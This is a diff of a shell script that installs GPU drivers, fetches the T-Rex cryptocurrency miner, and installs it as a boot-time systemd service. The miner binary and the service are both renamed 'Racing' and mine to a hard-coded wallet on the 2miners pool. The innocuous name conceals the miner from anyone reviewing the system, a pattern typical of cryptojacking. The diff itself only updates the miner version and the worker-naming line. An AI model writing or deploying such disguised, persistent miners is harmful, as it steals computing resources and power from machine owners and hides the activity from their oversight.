@@ -1,6 +1,6 @@
 cd /home
 myworker=$(date +'%d%m_%H%M%S_')
-username=$USER
+username=$HOSTNAME
 myworker+=$username
 sudo apt-get install linux-headers-$(uname -r) -y
 distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
@@ -15,8 +15,8 @@ sudo apt-get install cuda-drivers-510
 sudo apt-get install cuda-drivers-fabricmanager-510 -y
 sudo systemctl enable nvidia-fabricmanager
 sudo systemctl start nvidia-fabricmanager
-wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
-tar xvzf t-rex-0.21.6-linux.tar.gz
+wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz  
+tar -zxvf t-rex-0.22.1-linux.tar.gz
 mv t-rex racing
 sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 1P3CJd4X8Uj5oNo2ACBLx7DizzBhVvbqXx -p x -w ${myworker}_re\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
